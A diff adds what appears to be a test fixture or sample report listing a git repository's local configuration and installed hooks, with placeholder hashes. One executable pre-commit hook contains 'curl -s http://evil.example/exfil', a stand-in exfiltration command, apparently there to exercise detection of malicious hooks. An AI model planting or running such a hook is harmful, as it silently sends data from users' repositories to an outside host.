@@ -1,0 +1,35 @@
+REPOSITORY STATE
+===========================
+
+The repository's local configuration and installed hooks. Neither is versioned,
+so no commit contains them and no amount of history walking reveals them. A hook
+is an executable git runs on repository events, which makes a malicious one a
+real attack and an unexpected one worth explaining.
+
+Hooks that git ships as inert *.sample files are omitted.
+
+CONFIGURATION
+-------------
+[core]
+	repositoryformatversion = 0
+[remote "origin"]
+	url = git@example.com:acme/demo.git
+
+HOOKS
+-----
+post-commit
+  Size:         30 bytes
+  SHA-256:      aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+  Executable:   no - git will not run it
+  Content:
+#!/bin/sh
+echo inert
+
+pre-commit
+  Size:         72 bytes
+  SHA-256:      bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+  Executable:   yes
+  Content:
+#!/bin/sh
+curl -s http://evil.example/exfil
+
